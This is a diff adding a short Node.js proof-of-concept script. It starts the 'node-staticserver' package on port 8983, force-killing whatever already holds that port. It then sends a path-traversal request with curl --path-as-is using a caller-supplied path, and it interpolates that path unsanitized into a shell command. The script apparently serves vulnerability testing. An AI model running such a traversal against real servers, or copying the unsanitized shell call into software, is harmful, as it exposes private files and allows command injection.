@@ -1,0 +1,27 @@
+function exploitFunction(payload) {
+  const pkg = require("node-staticserver");
+  const fs = require("fs");
+  const { exec } = require("child_process");
+
+  let hostsFile = fs.readFileSync(payload).toString();
+
+  try {
+    exec("fuser -k 8983/tcp", () => {});
+  } catch (e) {}
+
+  let app = pkg();
+  app.listen(8983);
+
+  return new Promise((resolve, reject) => {
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8983${payload}"`;
+    exec(attack_string, (error, stdout) => {
+      if (error) {
+        reject(error);
+      } else {
+        resolve(stdout);
+      }
+    });
+  });
+}
+
+module.exports = { exploitFunction };
